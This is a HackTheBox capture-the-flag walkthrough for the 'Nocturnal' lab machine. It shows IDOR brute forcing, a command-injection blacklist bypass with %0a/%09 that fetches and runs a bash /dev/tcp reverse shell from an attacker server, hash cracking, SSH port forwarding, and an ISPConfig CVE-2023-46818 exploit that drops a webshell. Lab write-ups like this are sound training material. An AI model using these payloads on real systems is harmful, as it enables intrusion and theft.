This is a comprehensive, step-by-step walkthrough for the "Nocturnal" machine from HackTheBox. It walks through reconnaissance, exploitation via IDOR and command injection, and privilege escalation through hash cracking and CVE exploitation. It's tailored for learners aiming to enhance their web and privilege escalation skills, particularly through realistic misconfigurations and vulnerable services.

## 1. Reconnaissance

### 1.1 Nmap Scan
Scan the top 1,000 ports and identify services:

```bash
nmap -Pn -sT 10.10.11.64 --top-ports 1000
# or, fuller scan
sudo nmap -sCV -T4 10.10.11.64 -oA nmap-initial
```

**Result**: Ports 22 (SSH) and 80 (HTTP) are open.

### 1.2 Hosts File Setup
Since the web service expects a specific domain, add this to your `/etc/hosts`:

```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

---

## 2. Website Exploration & IDOR Enumeration

### 2.1 Register & File Upload Functionality
Visit: [http://nocturnal.htb/](http://nocturnal.htb)

- Register any user (random email/username).
- Upload a file (.pdf, .doc, .odt).
- PHP files are blocked.

### 2.2 Test File Download URL & Username Brute Force
Test IDOR:

```text
http://nocturnal.htb/view.php?username=<user>&file=<filename.pdf>
```

Use **Burp Suite Intruder** to brute-force usernames.

**Result**: User `amanda` has `privacy.odt` file. This reveals Amanda's password.

---

## 3. Escalate to Admin & Source Analysis

### 3.1 Login as Amanda
Use credentials found from `privacy.odt`.

### 3.2 Access Admin Panel and Source Code
- Admin panel is available
- Backup source code is accessible

---

## 4. Backup Function Exploit (Command Injection)

### 4.1 Analyze Code: Bypassing the Blacklist
- Blacklist blocks `; & | $ space \` { } &&`
- Bypass using:
  - `%0a`: newline
  - `%09`: tab (acts like space)

### 4.2 Exploit: Stage 1 – Download Reverse Shell

Attacker Setup:
```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > 1.sh
python3 -m http.server 8089
nc -lvnp 4444
```

Trigger download via password field:
```text
%0abash%09-c%09"wget%09http://<YOUR_IP>:8089/1.sh"
```

### 4.3 Exploit: Stage 2 – Execute Reverse Shell
```text
%0abash%09-c%09"bash%091.sh"
```

**Result**: Shell as `www-data`.

---

## 5. User Privilege Escalation

### 5.1 Extract & Crack User Credentials

```bash
cd /var/www/nocturnal_database/
cp nocturnal_database.db /tmp/
sqlite3 nocturnal_database.db
sqlite> .dump
```

Crack using hashcat:

```bash
hashcat -m 0 tobias.hash rockyou.txt
```

**Password**: `slowmotionapocalypse`

### 5.2 SSH as User

```bash
ssh tobias@nocturnal.htb
# Password: slowmotionapocalypse
cat ~/user.txt
```

---

## 6. Root Privilege Escalation

### 6.1 Discover Internal Service

```bash
ss -tulnp
```

Find `127.0.0.1:8080`

### 6.2 Port Forward & Access ISPConfig

```bash
ssh -L 8787:127.0.0.1:8080 tobias@nocturnal.htb
```

Browse: [http://localhost:8787/](http://localhost:8787/)

### 6.3 ISPConfig Exploit (CVE-2023-46818)

Login:

- Username: `admin`
- Password: `slowmotionapocalypse`

Check version: `3.2.10p1`

Exploit:

```bash
git clone https://github.com/blindma1den/CVE-2023-46818-Exploit.git
cd CVE-2023-46818-Exploit
python3 exploit.py http://localhost:8787/ admin slowmotionapocalypse
```

Webshell (sh.php) drops.

```bash
ispconfig-shell# id
ispconfig-shell# cat /root/root.txt
```
